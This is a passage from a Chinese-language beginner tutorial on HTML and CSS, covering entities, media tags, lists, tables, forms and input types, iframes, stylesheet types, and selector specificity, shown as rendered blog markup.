class="number">1</span>.jpg  ./<span class="number">1</span>.jpg   当前</span><br><span class="line">        ./images/<span class="number">1</span>.jpg   下一级</span><br><span class="line">        ../i.jpg         上一级</span><br></pre></td></tr></table></figure><p><strong>特殊字符 (转义字符)：</strong><br>| 结果 | 实体名称 |<br>| —- | ——– |<br>| 空格 | &amp;nbsp    |<br>| &lt;    | &amp;lt      |<br>| &gt;    | &amp;gt      |<br>| &amp;    | &amp;amp     |<br>| “    | &amp;quot    |<br>| ‘    | &amp;apos    |<br>| ©    | &amp;copy    |</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如:输出  &lt;head&gt;    &amp;lt;head&amp;gt;</span><br></pre></td></tr></table></figure><blockquote><p><strong>HTML实体</strong>：<br>一些字符在 HTML 中是预留的，拥有特殊的含义，比如小于号‘&lt;’用于定义 HTML 标签的开始。如果我们希望浏览器正确地显示这些字符，我们必须在 HTML 源码中插入字符实体。分为ASCLL，符号实体，字符实体。</p></blockquote><p>多媒体标签，html5之后新增内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">&quot;./mus/1.mp3&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span>=<span class="string">&quot;controls&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span> <span class="attr">loop</span> <span class="attr">poster</span>=<span class="string">&quot;./images/linux.jpg&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;./mus/back.mp4&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/mp4&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;movie.webm&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/webm&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="HTML（三）列表-与-表格"><a href="#HTML（三）列表-与-表格" class="headerlink" title="HTML（三）列表 与 表格"></a>HTML（三）列表 与 表格</h2><p><strong>HTML 列表</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span>         无序列表：默认样式--实心列表符号</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  使用：新闻条，页面主导航，轮播图</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span>         有序列表：默认样式--数字顺序</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  使用：新闻条，页面主导航，轮播图</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  type属性：更改列表符号类型--a,A,i,I</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  start属性：控制列表符号开始位置，属性值只能为数字</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span>   </span><br><span class="line">     </span><br><span class="line">          </span><br><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span>         自定义列表</span><br><span class="line">  <span class="tag">&lt;<span class="name">dt</span>&gt;</span>放一个名词<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dd</span>&gt;</span>对该名词的解释<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dt</span>&gt;</span><span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span>  </span><br></pre></td></tr></table></figure><p><strong>HTML 表格</strong></p><p><strong>表格标签：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span>        定义表格</span><br><span class="line">   <span class="tag">&lt;<span class="name">caption</span>&gt;</span>表格标题<span class="tag">&lt;/<span class="name">caption</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span>        定义行</span><br><span class="line">     <span class="tag">&lt;<span class="name">th</span>&gt;</span>表头1<span class="tag">&lt;/<span class="name">th</span>&gt;</span> 定义列</span><br><span class="line">     <span class="tag">&lt;<span class="name">th</span>&gt;</span>表头2<span class="tag">&lt;/<span class="name">th</span>&gt;</span>   table属性：</span><br><span class="line">   <span class="tag">&lt;/<span class="name">tr</span>&gt;</span>                  width=&quot;&quot;        宽</span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span>                   height=&quot;&quot;       高</span><br><span class="line">     <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>            border=&quot;&quot;       边框</span><br><span class="line">     <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>            bordercolor=&quot;&quot;  边框颜色</span><br><span class="line">   <span class="tag">&lt;/<span class="name">tr</span>&gt;</span>                  bgcolor=&quot;&quot;      背景颜色</span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span>                   cellspacing=&quot;0&quot; 边框间距</span><br><span class="line">     <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>            cellpadding=&quot;0&quot; 边框与内容之间的距离</span><br><span class="line">     <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>            align=&quot;&quot;         水平对齐方式,属性值：right,center,left</span><br><span class="line">   <span class="tag">&lt;/<span class="name">tr</span>&gt;</span>                  valign=&quot;&quot;        垂直对齐方式,属性值：top,middle,bottom</span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">合并单元格：均写在<span class="tag">&lt;<span class="name">td</span>&gt;</span>标签中,*和谁合并删掉谁       </span><br><span class="line">  colspan=&quot;数字&quot;   合并列 数字代表合并几个单元格</span><br><span class="line">  rowspan=&quot;数字&quot;   合并行 数字代表合并几个单元格</span><br><span class="line">合并列与合并行相结合：先合并列，再合并行</span><br><span class="line">对齐方式：</span><br><span class="line">  align=&quot;&quot;         水平对齐方式,属性值：right,center,left</span><br><span class="line">  valign=&quot;&quot;        垂直对齐方式,属性值：top,middle,bottom</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTML 表单中有两种类型的单元格：</span><br><span class="line"></span><br><span class="line">    表头单元格 - 包含表头信息（由 th 元素创建）</span><br><span class="line">    标准单元格 - 包含数据（由 td 元素创建）</span><br><span class="line"></span><br><span class="line">th 元素内部的文本通常会呈现为居中的粗体文本，而 td 元素内的文本通常是左对齐的普通文本</span><br></pre></td></tr></table></figure><h2 id="HTML（四）表单"><a href="#HTML（四）表单" class="headerlink" title="HTML（四）表单"></a>HTML（四）表单</h2><p>1.表单本身为一个框架，表单中有很多 <strong>控件（元素）</strong><br>2.本质：完成双向交互，向服务器提交信息，<strong>搜集用户信息</strong><br>3.表单的使用：搜索框，登录框，文件上传，注册，留言板等等</p><p><strong>表单标签：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">属性：</span><br><span class="line">     name=&quot;&quot;     表单的名称</span><br><span class="line">     action=&quot;&quot;   属性值为 &quot;接口地址&quot; 把数据提交到服务器的 URL</span><br><span class="line">                 如果为空则提交到当前页面，也可采用绝对路径与相对路径</span><br><span class="line">     method=&quot;&quot;   数据传输方式：&quot;get / post&quot;</span><br><span class="line"> enctype 提交类型</span><br><span class="line">当上传文件时，要写该属性，</span><br><span class="line">enctype=&quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">enctype=&quot;multipart/form-data&quot;</span><br><span class="line"> target 在何处打开目标 URL</span><br><span class="line">     </span><br><span class="line">表单内部元素： <span class="tag">&lt;<span class="name">input</span> &gt;</span></span><br></pre></td></tr></table></figure><p><strong>get 与 post</strong></p><blockquote><p>get 默认值，显示提交，长度限制2KB，向服务器索取数据<br>post ”安全隐式提交“，无长度限制，一般准备数据提交后服务器处理再交付<br>get 参数提交到URL中，在URL中有显示，且 URL长度有限制<br>       post 上传文件等  数据流  HTTP请求正文中</p></blockquote><p><strong>input 标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> &gt;</span></span><br><span class="line">属性：</span><br><span class="line">  type       决定 input 所生成的表单类型</span><br><span class="line">  value      作为 input 的值，根据 type 的不同而作用不同</span><br><span class="line">  maxlength  最大长度</span><br><span class="line">  size       以字符为单位控制input的大小</span><br><span class="line">  name 属性名</span><br></pre></td></tr></table></figure><p><strong>input标签 的 type 属性</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">password   密码框</span><br><span class="line">text       文本框</span><br><span class="line">radio      单选框 （性别 name 值必须相同才能是单选框）</span><br><span class="line">checkbox   复选框 </span><br><span class="line">reset      重置按钮 </span><br><span class="line">submit     提交按钮</span><br><span class="line"><span class="selector-tag">button</span>     空按钮</span><br><span class="line">file       文件域 </span><br><span class="line">hidden     隐藏内容 </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/13/MTyhaoeVqJmXt5w.png" alt="image-20211113175140020"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">enctype</span><br><span class="line">application/x-www-form-urlencoded    默认值</span><br><span class="line">multipart/form-data  上传文件时使用</span><br></pre></td></tr></table></figure><p> 文本域：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">cols</span>=<span class="string">&quot;&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><p> 下拉列表：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;select name=&quot;&quot; size=&quot;&quot;&gt;</span><br><span class="line">      &lt;options&gt; </span><br><span class="line">      </span><br><span class="line">      &lt;/options&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">disabled</span><br><span class="line">readonly</span><br></pre></td></tr></table></figure><p>页面的嵌套:<br>iframe：从一个页面中引入另一个页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">&quot;1.html&quot;</span> <span class="attr">target</span>=<span class="string">&quot;frame1&quot;</span>&gt;</span>1.html<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;frame1&quot;</span> <span class="attr">src</span>=<span class="string">&quot;1.html&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210106161704671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>管理控制台：</strong></p><blockquote><p><strong>查看器</strong>：所查看的内容叫做  DOM –即文档对象模型–即树形结构，浏览器构造的<br><strong>控制台</strong>：可以执行JS代码<br><strong>网络</strong>：显示整个页面的所有网络请求  页面的网络连接<br><strong>存储</strong>：存储了页面的Cookie信息</p></blockquote><h2 id="CSS-（五）层叠样式表"><a href="#CSS-（五）层叠样式表" class="headerlink" title="CSS （五）层叠样式表"></a>CSS （五）<strong>层叠样式表</strong></h2><p>css 注释：<code>/* */</code></p><p><strong>一、语法组成：由 选择符 和 声明 构成</strong></p><blockquote><p>1.选择符用于选择 <strong>标签</strong><br>2.声明分为：<strong>属性</strong> 和 <strong>属性值</strong>，二者之间用冒号连接<br>3.声明放于花括号中，每条声明以分号结束<br><strong>注：所有CSS代码必须放在CSS样式表中</strong></p></blockquote><p><strong>二、CSS样式表：</strong></p><p><strong>1.内部样式表</strong> — 创建：<strong>style 标签</strong>，最好放在 head 标签中</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210111004211856.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>2.外部样式表</strong> — 创建：新建一个.css文件(开头最好写上<code>@charset &quot;utf-8&quot;; </code>用于控制当前编码格式)，然后导入到 html 页面内</p><p><strong>导入方式：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">方法一：<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./text.css&quot;</span>&gt;</span></span><br><span class="line">  rel=&quot;stylesheet&quot; 与css样式表建立关联性</span><br><span class="line">  href=&quot;&quot;          导入css样式表的路径</span><br><span class="line">  </span><br><span class="line">方法二：<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">           <span class="keyword">@import</span> url(路径);</span></span><br><span class="line"><span class="css">       </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">区别：</span><br><span class="line">1.本质：link是一个html标签；@import是css提供的一个导入方法</span><br><span class="line">2.加载顺序不同：link--导入的css代码与html同时加载；@import--等待html结构加载完毕后再加载样式</span><br><span class="line">3.兼容性：link兼容性较好</span><br><span class="line">4.JS操作dom的区别</span><br></pre></td></tr></table></figure><p><strong>3.内联样式表（内行样式）</strong>— 创建： &lt;标签 style=”样式表内容”&gt;&lt;/标签&gt;</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;border: 1px solid red; padding 10px&quot;</span>&gt;</span></span><br><span class="line">    测试</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>样式表的权重关系</strong>：<strong>体现了CSS的</strong> <strong>层叠性</strong></p><blockquote><p>1.<strong>内联样式表</strong>  权重最高<br>2.<strong>内部样式表</strong> 和 <strong>外部样式表</strong> 的权重关系与先后顺序有关，后面覆盖之前的<br><strong>注</strong>：仅仅覆盖产生冲突的属性（即相同的属性），不同的属性将继续执行。</p></blockquote><h2 id="CSS（六）选择符及其权重"><a href="#CSS（六）选择符及其权重" class="headerlink" title="CSS（六）选择符及其权重"></a>CSS（六）选择符及其权重</h2><p><strong>一、类型选择符 (标签选择符)</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将html的 标签 当作 选择符 </span><br><span class="line">特点：将会选择该页面中所有同类型的标签 </span><br><span class="line">使用：想要更改清除某标签的默认样式时，或者是想要统一某个标签样式时</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210111234358280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>二、id 选择器</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用：</span><br><span class="line">1.起id名称：给指定标签起一个 id名称</span><br><span class="line">   &lt;标签 id=&quot;名称&quot;&gt;&lt;/标签&gt; </span><br><span class="line">2. 写样式：#id名称&#123;css代码&#125; </span><br></pre></td></tr></table></figure><blockquote><p><strong>特点</strong>：<strong>唯一性</strong> – 同一个页面只能出现一次,主要用于划分网页外围结构</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210111234622484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>id命名规范：</strong></p><p><img src="https://img-blog.csdnimg.cn/20210111180429726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>三、类选择器 (class选择器)</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用：</span><br><span class="line">1.起class名称：</span><br><span class="line"> &lt;标签 class=&quot;名称 名称 名称...&quot;&gt;&lt;/标签&gt;</span><br><span class="line">2.写样式：.class名称&#123;css代码&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>特点</strong>:<br>1.同一个class可重复出现<br>2.一个标签可以有多个类名，空格隔开<br>3.可以用于调用一类样式</p></blockquote><p><strong>四、包含选择器 (关联选择器)</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">使用：嵌套</span><br><span class="line">.父元素选择符 .子元素选择符&#123;css代码&#125;</span><br><span class="line">也可使用 #  使用较灵活</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">table a&#123;</span><br><span class="line">color: #000;</span><br><span class="line">&#125;</span><br><span class="line">仅仅控制 table 中的 a 标签</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;www.baidu.com&quot;</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;www.baidu.com&quot;</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>五、群组选择符</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">使用：</span><br><span class="line">选择符1，选择符2，选择符3...&#123;css代码&#125;</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">h1,h2,h3&#123;</span><br><span class="line">color: #111;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>2<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>3<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>六、通配符：</strong>  * 选中页面中所有标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*&#123;</span><br><span class="line">    margin:0;   盒子外围间距</span><br><span class="line">    padding:0;  盒子内部间距</span><br><span class="line"> &#125;</span><br><span class="line"> 将页面中所有标签的 页面间距 均清零</span><br><span class="line"> 因此每次在样式开头记得写上</span><br></pre></td></tr></table></figure><p><strong>七、伪类选择器</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> a:link&#123;color: #ff0000; text-decoration: none&#125;    初始状态的样式</span><br><span class="line"> a:visited&#123;color: #00ff 00; text-decoration: none&#125; 点击过后的样式</span><br><span class="line"> a:hover&#123;color: #0000ff; text-decoration: none&#125;   鼠标划过的样式</span><br><span class="line"> a:active&#123;color: #0f0f00; text-decoration: none&#125;  鼠标按下的样式</span><br><span class="line"> </span><br><span class="line">注：不要更改这四个样式的顺序</span><br></pre></td></tr></table></figure><p><strong>hover</strong></p><p>可更改自身以及自己子元素的样式，无法更改其父元素的样式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">常用方式：交互</span><br><span class="line">a:&#123;</span><br><span class="line">    color:black; 默认颜色黑色</span><br><span class="line">  &#125;</span><br><span class="line">a:hover&#123;</span><br><span class="line">    color:red;   鼠标划过时红色</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>实现划过父元素更改子元素：<br><img src="https://img-blog.csdnimg.cn/20210111233526248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>划过子元素更改父元素无法实现</p><h2 id="CSS-选择符的权重"><a href="#CSS-选择符的权重" class="headerlink" title="CSS 选择符的权重"></a>CSS 选择符的权重</h2><p><strong>1. ! important &gt; 内联样式 &gt; id &gt; class &gt; 标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">内联样式       1000</span><br><span class="line">id            100</span><br><span class="line">class、伪类    10</span><br><span class="line">标签           1</span><br><span class="line">通配符         0   </span><br><span class="line">包含选择符      权重是所有权重之和</span><br><span class="line">群组选择符      权重保持不变，看顺序，后覆盖前</span><br></pre></td></tr></table></figure><p><strong>2.CSS选择符的权重关系体现CSS的层叠性</strong></p><p><strong>3.开发者样式 &gt; 读者样式 &gt; 浏览器样式</strong></p><h2 id="CSS-中常见的属性"><a href="#CSS-中常见的属性" class="headerlink" title="CSS 中常见的属性"></a>CSS 中常见的属性</h2><p><strong>color 颜色属性：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">background-color: rgba(255,255,255,0);  #最后一个代表透明度</span><br><span class="line">background-color: #FFFFFF;</span><br></pre></td></tr></table></figure><p><strong>font 属性：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">font-size:#大小</span><br><span class="line">font-family:&quot;Microsoft Yahei&quot;#字体：</span><br><span class="line">font-style:#normal正常 italic斜体  oblique 倾斜的字体 </span><br><span class="line">font-weight:#字体加粗 bold</span><br></pre></td></tr></table></figure><p><strong>文本属性：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">text-indent:30px首行缩进</span><br><span class="line">text-overflow:文本溢出是否使用 省略号</span><br><span class="line">white-space:nowrap强制在同一行显示文本</span><br><span class="line">overflow:hidden; white-space:nowrap; 